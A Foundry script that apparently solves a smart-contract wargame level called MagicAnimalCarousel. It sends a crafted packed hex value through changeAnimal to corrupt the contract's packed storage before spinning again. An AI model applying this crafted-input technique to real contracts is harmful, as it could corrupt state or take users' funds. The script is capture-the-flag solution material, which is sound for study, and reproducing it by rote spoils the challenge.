pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/33-MagicAnimalCarousel.sol";


contract Exploit {

}

contract Exp is Script {
    MagicAnimalCarousel public MagicAnimalCarouselInstance = MagicAnimalCarousel(payable(0x075665f610C53f84bA6f568525592944F6dA639E));  //address为生成实例的合约实例地址
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");

    function attack() public {

        string memory animal = string(
            abi.encodePacked(hex"10000000000000000000ffff")
        );

        MagicAnimalCarouselInstance.setAnimalAndSpin("sbhack");
        MagicAnimalCarouselInstance.changeAnimal(animal, 1);
        MagicAnimalCarouselInstance.setAnimalAndSpin("Charmander");
    }

    function run() external {
        vm.startBroadcast(hacker);

        attack();

        vm.stopBroadcast();
    }
}